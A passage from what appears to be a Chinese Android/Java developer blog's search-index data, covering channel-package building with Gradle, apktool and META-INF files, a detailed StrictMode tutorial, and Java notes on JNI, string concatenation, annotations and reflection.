这种打渠道包的方法的优点在于可以对渠道包进行多种属性的定制，然而缺点在于每打一个渠道包都要重新执行一次编译过程，当渠道的数量较多或者工程编译过程较长时，会耗费相当多的时间，而且当渠道包多到一定程度的时候，配置渠道包的冗长的脚本也会让人抓狂。 使用apktool反编译apk加入渠道信息apktool是用于编译以及反编译apk的工具，我们可以通过使用apktool来反编译我们打出的普通apk文件，为其中添加渠道信息后再重新编译。具体操作流程如下：首先我们在AndroidManifest中添加元数据的渠道信息： 123&lt;meta-data android:name=\"channel\" android:value=\"BASE_CHANNEL\" /&gt; 接着执行我们的gradle任务，在此，我们把任务分为几个步骤一一列出（下列代码写在Module的build.gradle文件中）首先，通过apktool反编译apk： 1234task decompileApk(type: Exec, dependsOn: 'assembleRelease') &#123; workingDir 'build/outputs/apk' commandLine 'java', '-jar', 'apktool_2.2.3.jar', 'd', '-f', 'app-release.apk', '-o', 'base-apk'&#125; 反编译后我们把文件保存在base-apk目录下，其中可以看到我们要加入渠道信息的AndroidManifest.xml文件： 12345678910111213&lt;?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"no\"?&gt;&lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" package=\"com.example.superxlcr.buildchanneltest\" platformBuildVersionCode=\"26\" platformBuildVersionName=\"8.0.0\"&gt; &lt;meta-data android:name=\"android.support.VERSION\" android:value=\"26.0.0-alpha1\"/&gt; &lt;application android:allowBackup=\"true\" android:icon=\"@mipmap/ic_launcher\" android:label=\"@string/app_name\" android:supportsRtl=\"true\" android:theme=\"@style/AppTheme\"&gt; &lt;activity android:name=\"com.example.superxlcr.buildchanneltest.MainActivity\"&gt; &lt;intent-filter&gt; &lt;action android:name=\"android.intent.action.MAIN\"/&gt; &lt;category android:name=\"android.intent.category.LAUNCHER\"/&gt; &lt;/intent-filter&gt; &lt;/activity&gt; &lt;meta-data android:name=\"channel\" android:value=\"BASE_CHANNEL\"/&gt; &lt;/application&gt;&lt;/manifest&gt; 接下来我们读取channel.txt文件的渠道信息，并返回一个列表： 1234567def ArrayList&lt;String&gt; getChannelList() &#123; ArrayList&lt;String&gt; list = new ArrayList&lt;String&gt;(); file('build/outputs/apk/channel.txt').eachLine &#123; channel -&gt; list.add(channel); &#125; return list;&#125; 然后我们继续执行任务，替换xml中的‘BASE_CHANNEL’字符串为我们的渠道信息： 12345678910111213141516171819202122task addChannelInfo(dependsOn: decompileApk) &lt;&lt; &#123; final String BASE_CHANNEL_NAME = 'BASE_CHANNEL'; ArrayList&lt;String&gt; channelList = getChannelList(); for (String channel : channelList) &#123; String channelDir = \"build/outputs/apk/$&#123;channel&#125;\"; copy &#123; from 'build/outputs/apk/base-apk' into channelDir &#125; file(\"$&#123;channelDir&#125;/AndroidManifest_new.xml\").createNewFile(); file(\"$&#123;channelDir&#125;/AndroidManifest_new.xml\").withWriter('UTF-8') &#123; writer -&gt; file(\"$&#123;channelDir&#125;/AndroidManifest.xml\").withReader('UTF-8') &#123; reader -&gt; reader.eachLine &#123; line -&gt; writer.append(line.replaceAll(BASE_CHANNEL_NAME, channel)); writer.append('\\r\\n'); &#125; &#125; &#125; file(\"$&#123;channelDir&#125;/AndroidManifest.xml\").delete(); file(\"$&#123;channelDir&#125;/AndroidManifest_new.xml\").renameTo(file(\"$&#123;channelDir&#125;/AndroidManifest.xml\")); &#125;&#125; 最后我们再通过apktool回编译出我们的apk文件，此时apk文件由于进行了修改，因此需要进行重新签名验证： 12345678910111213141516171819task buildChannelApk(dependsOn: addChannelInfo) &lt;&lt; &#123; getChannelList().each &#123; channel -&gt; exec &#123; workingDir 'build/outputs/apk' commandLine 'java', '-jar', 'apktool_2.2.3.jar', 'b', channel, '-o', \"$&#123;channel&#125;-unsigned.apk\" &#125; exec &#123; workingDir 'build/outputs/apk' commandLine 'jarsigner', '-sigalg', 'MD5withRSA', '-digestalg', 'SHA1', '-keystore', 'your_keystore_path', '-storepass', 'your_keystore_password', '-signedjar', \"$&#123;channel&#125;.apk\", \"$&#123;channel&#125;-unsigned.apk\", 'your_alias' &#125; file(\"build/outputs/apk/$&#123;channel&#125;-unsigned.apk\").delete(); file(\"build/outputs/apk/$&#123;channel&#125;\").deleteDir(); file('build/outputs/apk/base-apk').deleteDir(); &#125;&#125; 最后我们可以得到的以渠道名命名的apk包 当我们需要获取渠道信息时，调用以下函数即可： 12345678910private String getChannel(Context context) &#123; try &#123; PackageManager pm = context.getPackageManager(); ApplicationInfo appInfo = pm.getApplicationInfo(context.getPackageName(), PackageManager.GET_META_DATA); return appInfo.metaData.getString(\"channel\"); &#125; catch (PackageManager.NameNotFoundException e) &#123; e.printStackTrace(); &#125; return \"\";&#125; 这种使用apktool工具来添加渠道信息的方法虽然没有Gradle自带的编写渠道包方法定制功能强，但会相对比较快，因为编译过程较短，主要需要重新签名，而且配置渠道文件也较为简单，仅为txt文本。 META-INF添加渠道信息使用apktool工具虽然比Gradle提供的打渠道包快，但因为修改了文件还是要执行签名工作，有没有什么方法呢能直接修改apk的渠道号，而不需要再重新签名呢？答案是有的，当我们解压apk文件时，我们会发现一个META-INF目录 该目录主要存放于检验apk文件相关的签名文件与校验文件等。对于apk的签名方法，往META-INF中添加空白文件并不会影响apk的校验值，因此我们可以以我们的渠道名新建一个空白文件添加进去即可。gradle代码如下，自动构建apk目录下channel.txt文件中的渠道包： 1234567891011121314151617task addChannelInfoByAnt(dependsOn: 'assembleRelease') &lt;&lt; &#123; def dir = 'build/outputs/apk' getChannelList().each &#123; channel -&gt; copy &#123; from \"$&#123;dir&#125;/app-release.apk\" into dir rename &#123; \"$&#123;channel&#125;.apk\" &#125; &#125; file(\"$&#123;dir&#125;/$&#123;channel&#125;\").mkdir(); file(\"$&#123;dir&#125;/$&#123;channel&#125;/META-INF\").mkdir(); file(\"$&#123;dir&#125;/$&#123;channel&#125;/META-INF/channel_$&#123;channel&#125;\").createNewFile(); ant.zip(basedir: \"$&#123;dir&#125;/$&#123;channel&#125;\", includes: \"META-INF/channel_$&#123;channel&#125;\", keepcompression: true, update: true, destfile: \"$&#123;dir&#125;/$&#123;channel&#125;.apk\"); file(\"$&#123;dir&#125;/$&#123;channel&#125;\").deleteDir(); &#125;&#125; 这里解释一下ant.zip这句代码：这句代码使用ant工具创建了一个zip类型的task执行压缩任务，其中includes参数表示要包含的文件，默认值为xx，即basedir下所有文件keepcompression参数表示对已压缩的文件保持压缩状态而非重新压缩update参数表示如果destfile目标文件已经出现，进行更新而非重写覆盖更详细的资料可以参考官方的文档http://ant.apache.org/manual/Tasks/zip.html python代码如下： 1234import zipfilezipped = zipfile.ZipFile(your_apk, &apos;a&apos;, zipfile.ZIP_DEFLATED) empty_channel_file = &quot;META-INF/channel_&#123;channel&#125;&quot;.format(channel=your_channel)zipped.write(your_empty_file, empty_channel_file) 上面代码渠道信息我们添加了channel_的前缀。虽说apk可以通过zip的方法打开，但是貌似不能随便使用zip来进行解压与并重新压缩，本人试过多次Java的ZipEntry等方式来解压压缩apk，均以失败告终。目前发现可以更新apk压缩包的方法仅以上两种。（看到ant官方zip类型task相关的资料描述，猜测与zip压缩时间戳相关，重新解压压缩会影响zip文件的时间戳相关参数）当我们需要在Java中取得渠道信息时，调用以下代码即可： 123456789101112131415161718192021222324252627282930313233343536public static String getChannel(Context context) &#123; ApplicationInfo appinfo = context.getApplicationInfo(); String sourceDir = appinfo.sourceDir; String ret = \"\"; ZipFile zipfile = null; try &#123; zipfile = new ZipFile(sourceDir); Enumeration&lt;?&gt; entries = zipfile.entries(); while (entries.hasMoreElements()) &#123; ZipEntry entry = ((ZipEntry) entries.nextElement()); String entryName = entry.getName(); if (entryName.startsWith(\"channel\")) &#123; ret = entryName; break; &#125; &#125; &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; finally &#123; if (zipfile != null) &#123; try &#123; zipfile.close(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; &#125; String[] split = ret.split(\"_\"); if (split != null &amp;&amp; split.length &gt;= 2) &#123; return ret.substring(split[0].length() + 1); &#125; else &#123; return \"\"; &#125; &#125; 相较于其他两种添加渠道信息的方法，往META-INF中添加空白文件由于不用签名，属于最快、最方便的一种方法了。","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"应用","slug":"应用","permalink":"https://superxlcr.github.io/tags/应用/"},{"name":"编译","slug":"编译","permalink":"https://superxlcr.github.io/tags/编译/"}]},{"title":"Android严苛模式StrictMode使用详解","slug":"Android严苛模式StrictMode使用详解","date":"2017-07-15T08:48:01.000Z","updated":"2020-05-11T07:23:44.558Z","comments":true,"path":"2017/07/15/Android严苛模式StrictMode使用详解/","link":"","permalink":"https://superxlcr.github.io/2017/07/15/Android严苛模式StrictMode使用详解/","excerpt":"","text":"StrictMode类是Android 2.3 （API 9）引入的一个工具类，可以用来帮助开发者发现代码中的一些不规范的问题，以达到提升应用响应能力的目的。举个例子来说，如果开发者在UI线程中进行了网络操作或者文件系统的操作，而这些缓慢的操作会严重影响应用的响应能力，甚至出现ANR对话框。为了在开发中发现这些容易忽略的问题，我们使用StrictMode，系统检测出主线程违例的情况并做出相应的反应，最终帮助开发者优化和改善代码逻辑。官网文档：http://developer.android.com/reference/android/os/StrictMode.html StrictMode具体能检测什么严苛模式主要检测两大问题，一个是线程策略，即ThreadPolicy，另一个是VM策略，即VmPolicy。 ThreadPolicy线程策略检测 自定义的耗时调用 使用detectCustomSlowCalls()开启 磁盘读取操作 使用detectDiskReads()开启 磁盘写入操作 使用detectDiskWrites()开启 网络操作 使用detectNetwork()开启 VmPolicy虚拟机策略检测 Activity泄露 使用detectActivityLeaks()开启 未关闭的Closable对象泄露 使用detectLeakedClosableObjects()开启 泄露的Sqlite对象 使用detectLeakedSqlLiteObjects()开启 检测实例数量 使用setClassInstanceLimit()开启 工作原理其实StrictMode实现原理也比较简单，以IO操作为例，主要是通过在open，read，write，close时进行监控。libcore.io.BlockGuardOs文件就是监控的地方。以open为例，如下进行监控。 12345678@Overridepublic FileDescriptor open(String path, int flags, int mode) throws ErrnoException &#123; BlockGuard.getThreadPolicy().onReadFromDisk(); if ((mode &amp; O_ACCMODE) != O_RDONLY) &#123; BlockGuard.getThreadPolicy().onWriteToDisk(); &#125; return os.open(path, flags, mode);&#125; 其中onReadFromDisk()方法的实现，代码位于StrictMode.Java中。 1234567891011public void onReadFromDisk() &#123; if ((mPolicyMask &amp; DETECT_DISK_READ) == 0) &#123; return; &#125; if (tooManyViolationsThisLoop()) &#123; return; &#125; BlockGuard.BlockGuardPolicyException e = new StrictModeDiskReadViolation(mPolicyMask); e.fillInStackTrace(); startHandlingViolationException(e);&#125; 常见用法严格模式的开启可以放在Application或者Activity以及其他组件的onCreate方法。为了更好地分析应用中的问题，建议放在Application的onCreate方法中。其中，我们只需要在app的开发版本下使用 StrictMode，线上版本避免使用 StrictMode，这里定义了一个布尔值变量DEV_MODE来进行控制。 123456789101112131415161718192021private boolean DEV_MODE = true; public void onCreate() &#123; if (DEV_MODE) &#123; StrictMode.setThreadPolicy(new StrictMode.ThreadPolicy.Builder() .detectCustomSlowCalls() //API等级11，使用StrictMode.noteSlowCode .detectDiskReads() .detectDiskWrites() .detectNetwork() // or .detectAll() for all detectable problems .penaltyDialog() //弹出违规提示对话框 .penaltyLog() //在Logcat 中打印违规异常信息 .penaltyFlashScreen() //API等级11 .build()); StrictMode.setVmPolicy(new StrictMode.VmPolicy.Builder() .detectLeakedSqlLiteObjects() .detectLeakedClosableObjects() //API等级11 .penaltyLog() .penaltyDeath() .build()); &#125; super.onCreate(); &#125; 其中Android3.0引入的方法包括detectCustomSlowCalls()和noteSlowCode()，它们都是用来检测应用中执行缓慢代码的或者潜在的缓慢代码。 查看报告结果严格模式有很多种报告违例的形式，但是想要分析具体违例情况，还是需要查看日志，终端下过滤StrictMode就能得到违例的具体stacktrace信息。 1adb logcat | grep StrictMode 当然也可以选择弹窗形式来简明提醒开发者 ThreadPolicy 详解StrictMode.ThreadPolicy.Builder 主要方法如下 detectNetwork()用于检查UI线程中是否有网络请求操作 检测UI线程中网络请求案例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445public class MainActivity extends AppCompatActivity implements View.OnClickListener &#123; Button btnTest; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); StrictMode.setThreadPolicy(new StrictMode.ThreadPolicy.Builder() .detectNetwork() .penaltyLog() .build()); btnTest = (Button) findViewById(R.id.btn_test); btnTest.setOnClickListener(this); &#125; @Override public void onClick(View v) &#123; int id = v.getId(); switch (id) &#123; case R.id.btn_test: postNetwork(); break; &#125; &#125; /** * 网络连接的操作 */ private void postNetwork() &#123; try &#123; URL url = new URL(\"http://www.wooyun.org\"); HttpURLConnection conn = (HttpURLConnection) url.openConnection(); conn.connect(); BufferedReader reader = new BufferedReader(new InputStreamReader( conn.getInputStream())); String lines = null; StringBuffer sb = new StringBuffer(); while ((lines = reader.readLine()) != null) &#123; sb.append(lines); &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 运行后，触发的警告如下 detectDiskReads()和detectDiskWrites()是磁盘读写检查 123456789101112131415161718192021222324252627282930313233343536373839404142434445磁盘读写检查案例：public Button btnTest; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); StrictMode.setThreadPolicy(new StrictMode.ThreadPolicy.Builder() .detectDiskWrites() .detectDiskReads() .penaltyLog() .build()); btnTest = (Button) findViewById(R.id.btn_test); btnTest.setOnClickListener(this); &#125; @Override public void onClick(View v) &#123; int id = v.getId(); switch (id) &#123; case R.id.btn_test: writeToExternalStorage(); break; &#125; &#125; /** * 文件系统的操作 */ public void writeToExternalStorage() &#123; File externalStorage = Environment.getExternalStorageDirectory(); File mbFile = new File(externalStorage, \"castiel.txt\"); try &#123; OutputStream output = new FileOutputStream(mbFile, true); output.write(\"www.wooyun.org\".getBytes()); output.flush(); output.close(); &#125; catch (FileNotFoundException e) &#123; e.printStackTrace(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 运行后，触发的警告如下 noteSlowCall针对执行比较耗时的检查StrictMode从 API 11开始允许开发者自定义一些耗时调用违例，这种自定义适用于自定义的任务执行类中，比如我们有一个进行任务处理的类，为TaskExecutor。 12345public class TaskExecutor &#123; public void execute(Runnable task) &#123; task.run(); &#125;&#125; 先需要跟踪每个任务的耗时情况，如果大于500毫秒需要提示给开发者，noteSlowCall就可以实现这个功能，如下修改代码 123456789101112public class TaskExecutor &#123; private static long SLOW_CALL_THRESHOLD = 500; public void executeTask(Runnable task) &#123; long startTime = SystemClock.uptimeMillis(); task.run(); long cost = SystemClock.uptimeMillis() - startTime; if (cost &gt; SLOW_CALL_THRESHOLD) &#123; StrictMode.noteSlowCall(\"slowCall cost=\" + cost); &#125; &#125;&#125; 执行一个耗时2000毫秒的任务 1234567891011TaskExecutor executor = new TaskExecutor();executor.executeTask(new Runnable() &#123; @Override public void run() &#123; try &#123; Thread.sleep(2000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125;&#125;); 得到的违例日志，注意其中~duration=20 ms并非耗时任务的执行时间，而我们的自定义信息msg=slowCall cost=2000才包含了真正的耗时。 penaltyDeath()当触发违规条件时，直接Crash掉当前应用程序。 penaltyDeathOnNetwork()当触发网络违规时，Crash掉当前应用程序。 penaltyDialog()触发违规时，显示对违规信息对话框。 penaltyFlashScreen()会造成屏幕闪烁，不过一般的设备可能没有这个功能。 penaltyDropBox()将违规信息记录到 dropbox 系统日志目录中（/data/system/dropbox），你可以通过如下命令进行插件： 1adb shell dumpsys dropbox dataappstrictmode --print permitCustomSlowCalls()、permitDiskReads ()、permitDiskWrites()、permitNetwork()如果你想关闭某一项检测，可以使用对应的permit方法。 VMPolicy 详解StrictMode.VmPolicy.Builder 主要方法如下 detectActivityLeaks()用户检查 Activity 的内存泄露情况 内存泄露检查案例： 1234567891011121314151617181920212223public class MainActivity extends AppCompatActivity implements View.OnClickListener &#123; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); StrictMode.setVmPolicy(new StrictMode.VmPolicy.Builder() .detectActivityLeaks() .penaltyLog() .build() ); new Thread() &#123; @Override public void run() &#123; while (true) &#123; SystemClock.sleep(1000); &#125; &#125; &#125;.start(); &#125;&#125; 我们反复旋转屏幕就会输出提示信息（重点在 instances=2; limit=1 这一行）这时因为，我们在Activity中创建了一个Thread匿名内部类，而匿名内部类隐式持有外部类的引用。而每次旋转屏幕是，android会新创建一个Activity，而原来的Activity实例又被我们启动的匿名内部类线程持有，所以不会释放，从日志上看，当先系统中该Activty有4个实例，而限制是只能创建1各实例。我们不断翻转屏幕，instances 的个数还会持续增加。 detectLeakedClosableObjects()用于资源没有正确关闭时提醒 1234567891011121314151617181920212223// 资源引用没有关闭检查案例public class MainActivity extends AppCompatActivity implements View.OnClickListener &#123; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); StrictMode.setVmPolicy(new StrictMode.VmPolicy.Builder() .detectLeakedClosableObjects() .penaltyLog() .build() ); File newxmlfile = new File(Environment.getExternalStorageDirectory(), \"castiel.txt\"); try &#123; newxmlfile.createNewFile(); FileWriter fw = new FileWriter(newxmlfile); fw.write(\"猴子搬来的救兵WooYun\"); //fw.close(); 我们在这里特意没有关闭 fw &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 运行后触发警告如下 detectLeakedSqlLiteObjects()和detectLeakedClosableObjects()用法类似，只不过是用来检查 SQLiteCursor 或者 其他 SQLite 对象是否被正确关闭 detectLeakedRegistrationObjects()用来检查 BroadcastReceiver 或者ServiceConnection 注册类对象是否被正确释放 setClassInstanceLimit()设置某个类的同时处于内存中的实例上限，可以协助检查内存泄露 12345678910111213141516171819202122232425262728// 检测内存泄露案例public class MainActivity extends AppCompatActivity implements View.OnClickListener &#123; private static &#125; private static List&lt;CastielClass&gt; classList; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); classList = new ArrayList&lt;CastielClass&gt;(); StrictMode.setVmPolicy(new StrictMode.VmPolicy.Builder() .setClassInstanceLimit(CastielClass.class, 2) .penaltyLog() .build()); classList.add(new CastielClass()); classList.add(new CastielClass()); classList.add(new CastielClass()); classList.add(new CastielClass()); classList.add(new CastielClass()); classList.add(new CastielClass()); classList.add(new CastielClass()); classList.add(new CastielClass()); &#125;&#125; 其他操作除了通过日志查看之外，我们也可以在开发者选项中开启严格模式，开启之后，如果主线程中有执行时间长的操作，屏幕则会闪烁，这是一个更加直接的方法。 注意事项 只在开发阶段启用StrictMode，发布应用或者release版本一定要禁用它。 严格模式无法监控JNI中的磁盘IO和网络请求。 应用中并非需要解决全部的违例情况，比如有些IO操作必须在主线程中进行。 补充最近博主在使用StrictMode扫描UI线程文件io操作的时候，发现了一些问题：当博主在Application#onCreate方法中开启了相应的StrictMode#ThreadPolicy策略后，却发现没有任何的效果通过StrictMode#getThreadPolicyMask打印设置策略后的标志位，发现在Application设置后，标志位会有相应的改动，不过在首个启动的Activity#onCreate中打印时，标志位却又变回原来的设置了也就是说在Application#onCreate方法之后，首个Activity#onCreate方法之前，StrictMode#ThreadPolicy的策略又被改动回来了在查阅了相关源码后，在ActivityThread中发现了如下代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162private void handleBindApplication(AppBindData data) &#123; ... // Allow disk access during application and provider setup. This could // block processing ordered broadcasts, but later processing would // probably end up doing the same disk access. Application app; final StrictMode.ThreadPolicy savedPolicy = StrictMode.allowThreadDiskWrites(); final StrictMode.ThreadPolicy writesAllowedPolicy = StrictMode.getThreadPolicy(); try &#123; // If the app is being launched for full backup or restore, bring it up in // a restricted environment with the base application class. app = data.info.makeApplication(data.restrictedBackupMode, null); // Propagate autofill compat state app.setAutofillCompatibilityEnabled(data.autofillCompatibilityEnabled); mInitialApplication = app; // don't bring up providers in restricted mode; they may depend on the // app's custom Application class if (!data.restrictedBackupMode) &#123; if (!ArrayUtils.isEmpty(data.providers)) &#123; installContentProviders(app, data.providers); // For process that contains content providers, we want to // ensure that the JIT is enabled \"at some point\". mH.sendEmptyMessageDelayed(H.ENABLE_JIT, 10*1000); &#125; &#125; // Do this after providers, since instrumentation tests generally start their // test thread at this point, and we don't want that racing. try &#123; mInstrumentation.onCreate(data.instrumentationArgs); &#125; catch (Exception e) &#123; throw new RuntimeException( \"Exception thrown in onCreate() of \" + data.instrumentationName + \": \" + e.toString(), e); &#125; try &#123; // 这里回调Application#onCreate，通常在此处进行StrictMode相关设置 mInstrumentation.callApplicationOnCreate(app); &#125; catch (Exception e) &#123; if (!mInstrumentation.onException(app, e)) &#123; throw new RuntimeException( \"Unable to create application \" + app.getClass().getName() + \": \" + e.toString(), e); &#125; &#125; &#125; finally &#123; // 如果targetSdk小于27，把StrictMode改为savedPolicy，即允许disk io出现在UI线程 // If the app targets &lt; O-MR1, or doesn't change the thread policy // during startup, clobber the policy to maintain behavior of b/36951662 if (data.appInfo.targetSdkVersion &lt; Build.VERSION_CODES.O_MR1 || StrictMode.getThreadPolicy().equals(writesAllowedPolicy)) &#123; StrictMode.setThreadPolicy(savedPolicy); &#125; &#125; ...&#125; 省略了部分无关代码，在43行，ActivityThread回调了我们Application#onCreate方法，我们也通常在此设置了StrictMode相关的设置然而，在第57行会判断，如果我们app的targetSdk小于27，则会重新把StrictMode设置为允许disk io出现在UI线程为啥会实现这样子，博主表示也不清楚，可能为官方的问题博主试过在第一个启动的Activity#onCreate重新打开后，会导致主线程使用SharedPreferences以及调用Activity#setContentView等也会出现警告log，虽然误判有一些，不过感觉还是可以使用的Ps：博主的compileSdkVersion以及buildToolsVersion均为28","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"应用","slug":"应用","permalink":"https://superxlcr.github.io/tags/应用/"},{"name":"内存","slug":"内存","permalink":"https://superxlcr.github.io/tags/内存/"}]},{"title":"关于一些基础的Java问题的解答（八）","slug":"关于一些基础的Java问题的解答（八）","date":"2017-07-09T08:31:16.000Z","updated":"2020-05-11T07:23:44.832Z","comments":true,"path":"2017/07/09/关于一些基础的Java问题的解答（八）/","link":"","permalink":"https://superxlcr.github.io/2017/07/09/关于一些基础的Java问题的解答（八）/","excerpt":"","text":"上一篇文章的传送门：关于一些基础的Java问题的解答（七） JNI的使用先简单介绍一下JNI，JNI即Java Native Interface的缩写，中文译为“Java本地调用”。通俗的说，JNI是一种实现Java层与Native层（C/C++）交互的技术。有时为了追求效率问题，或者是使用用native代码编写的函数库，我们就不得不使用JNI接口。以下是一个JNI的小例子： 12345678910public class Main &#123; public static void main(String[] args) throws Exception &#123; // 动态库名字，windows平台自动拓展成makeStr_jni.dll System.loadLibrary(\"makeStr_jni\"); // 打印字符串 printString(\"Java World!\"); &#125; // native关键字表示为本地方法 public static native void printString(String str); &#125; 我们在Java中使用JNI接口只需要两步： 使用native关键字声明某方法为本地方法 使用System.loadLibrary加载由C/C++编写成的动态链接库（我们只需要写出库名字即可，Java会根据平台补充库的后缀名windows：dll，linux：so） 接下来我们来看看如何编写Native层的cpp文件（以下注册Native函数方法为静态注册，动态注册本文不提及）：为了让Java层中的函数与Native层中的函数一一对应，JNI规定了一套复杂的命名体系。在此本文就不深入介绍该命名方法了，我们使用JDK提供的javah工具生成对应的.h头文件：首先我们把写好的Java代码编译成.class文件： 然后我们使用javah工具生成对应的.h头文件（-o后面第一个参数为.h的文件名，第二个参数为.class的文件名）： 然后我们就能看到生成的.h文件了： 以下是.h文件中的代码： 123456789101112131415161718192021/* DO NOT EDIT THIS FILE - it is machine generated */#include \"jni.h\"/* Header for class Main */#ifndef _Included_Main#define _Included_Main#ifdef __cplusplusextern \"C\" &#123;#endif/* * Class: Main 方法所在的类 * Method: printString 方法名 * Signature: (Ljava/lang/String;)V 签名 */JNIEXPORT void JNICALL Java_Main_printString (JNIEnv *, jclass, jstring);#ifdef __cplusplus&#125;#endif#endif 可以看到我们在Java层定义的printString方法对应成了Native层的Java_Main_printString方法，方法上面有javah给我们生成的注释，它提供了以下信息： Class：方法所属于的类 Method：方法的名称 Signature：方法的签名。签名是由于Java中的方法允许重载，仅仅通过类与名称并不能确定该Native方法所对应的Java方法，因此JNI技术中就将参数类型和返回值的组合作为了一个函数的签名信息，有了签名和函数名我们才能顺利找到Javac层中对应的函数 接下来我们只要写一个.cpp文件实现该方法即可： 1234567891011121314151617181920#include&lt;iostream&gt;#include\"_Main.h\"using namespace std;/* * JNIEnv ： env JNI环境，一个提供JNI系统函数的结构体 * jclass ： clazz 代表Java层的Class对象，由于printString方法是一个静态方法，故传入Class对象 * jstring ： s 代表Java层的String对象，表示传入的参数 */ JNIEXPORT void JNICALL Java_Main_printString (JNIEnv * env, jclass clazz, jstring s) &#123; jboolean iscopy; // 通过jstring对象生成本地字符串 const char *charData = env-&gt;GetStringUTFChars(s, &amp;iscopy); // 打印字符串 cout &lt;&lt; \"A message from Native World: \" &lt;&lt; charData &lt;&lt; endl; // 释放资源 env-&gt;ReleaseStringUTFChars(s, charData); &#125; 以上代码相信注释已解释的非常清楚，故此处不再赘述。值得一提的是在Native层中有多种与Java层中相对应的数据结构，如：jclass代表Class对象，jstring代表String对象，jboolean代表boolean基本类型等。有兴趣的童鞋可以自行去了解下。写完该.cpp文件后，我们编译工程生成dll文件（Windows平台），并把文件加入我们Java工程的引用库中： 然后运行我们的Java代码，我们就可以看到使用JNI技术后来自Native层的问候： String拼接的两种方法，concat与+总的来说，区别有以下几点： concat是String方法，而“+”是String重载的操作符 concat只能连接String字符串，而“+”可以连接任何Object 由于String是不变的对象，concat底层是通过创建新的String对象实现拼接，而“+”使用的是StringBuilder工具实现拼接 Java元注解（Annotation）自Java5.0版本引入注解之后，它就成为了Java平台中非常重要的一部分。开发过程中，我们也时常在应用代码中会看到诸如@Override，@Deprecated这样的注解 用一个词就可以描述注解，那就是元数据，即一种描述数据的数据。所以，可以说注解就是源代码的元数据 当我们使用自定义的注解时，我们就会使用到Java提供的元注解。元注解的作用就是负责注解其他注解。Java5.0定义了4个标准的meta-annotation类型，它们被用来提供对其它 annotation类型作说明，它们均被存放在java.lang.annotation包下面，分别是： @Target @Retention @Documented @Inherited @Target@Target说明了Annotation所修饰的对象范围，它的取值（ElementType）有： CONSTRUCTOR：用于描述构造器 FIELD：用于描述域 LOCAL_VARIABLE：用于描述局部变量 METHOD：用于描述方法 PACKAGE：用于描述包 PARAMETER：用于描述参数 TYPE：用于描述类、接口（包括注解类型）或enum声明 例子： 12345678@Target(ElementType.TYPE)public @interface A &#123;&#125;@Target(ElementType.FIELD)public @interface B &#123;&#125; 注解A可以用于注解类、接口(包括注解类型) 或enum声明，而注解B仅可用于注解类的成员变量 @Retention@Retention定义了该Annotation被保留的时间长短，表示需要在什么级别保存该注释信息，用于描述注解的生命周期（即：被描述的注解在什么范围内有效），取值（RetentionPoicy）有： SOURCE：在源文件中有效（即源文件保留） CLASS：在class文件中有效（即class保留） RUNTIME：在运行时有效（即运行时保留，可以通过反射获取） @Documented@Documented用于描述其它类型的annotation应该被作为被标注的程序成员的公共API，表明这个注解应该被 javadoc工具记录， 默认情况下,javadoc是不包括注解的。但如果声明注解时指定了 @Documented,则它会被 javadoc 之类的工具处理，所以注解类型信息也会被包括在生成的文档中。@Documented是一个标记注解，没有成员 @Inherited@Inherited作用是，使用此注解声明出来的自定义注解时，如果自定义注解在类上面时，子类会自动继承此注解，否则的话，子类不会继承此注解。这里一定要记住，使用@Inherited声明出来的注解，只有在类上使用时才会有效，对方法，属性等其他无效。 具体的例子可以查看这篇博客：http://blog.csdn.net/snow_crazy/article/details/39381695 自定义注解（Annotation）使用@interface自定义注解时，自动继承了java.lang.annotation.Annotation接口，由编译程序自动完成其他细节。在定义注解时，不能继承其他的注解或接口。@interface用来声明一个注解，其中的每一个方法实际上是声明了一个配置参数。方法的名称就是参数的名称，返回值类型就是参数的类型（返回值类型只能是基本类型、Class、String、enum）。可以通过default来声明参数的默认值。通过使用元注解来标明自定义注解的某些功能。 定义注解格式：public @interface 注解名 {定义体} 注解参数的可支持数据类型如下： 所有基本数据类型（int,float,boolean,byte,double,char,long,short) String Class enum（枚举） Annotation（注解） 以上所有类型的数组 例子如下： 123456@Target(ElementType.TYPE)@Retention(RetentionPolicy.RUNTIME)public @interface DatabaseTable &#123; String tableName() default \"\";&#125; 上面的例子定义了一个用于描述类、接口（包括注解类型）或enum声明的、在运行时保留的（即可以反射获取的）注解，该注解拥有属性值tableName，默认值为空字符串，使用方法如下： 12@DatabaseTable(tableName = \"tableBean\")public class TableBean &#123;&#125; Java反射中getXXX与getDeclaredXXX方法的区别对于Fields： getField：只能获取类的public字段、但可以获取从父类继承的public字段 getDeclaredField：能获取当前类的所有字段、但不能获取从父类继承的字段 对于Methods： getMethods：只能获取类的public方法、但可以获取从父类继承的public方法 getDeclaredMethods：能获取当前类的所有方法、但不能获取从父类继承的方法 对于Constructors： getConstructors：返回所有的public构造器 getDeclaredConstructors：返回所有的构造器 对于Annotations： getAnnotations：对于Class（类），返回所有注解，包括@Inherited继承的 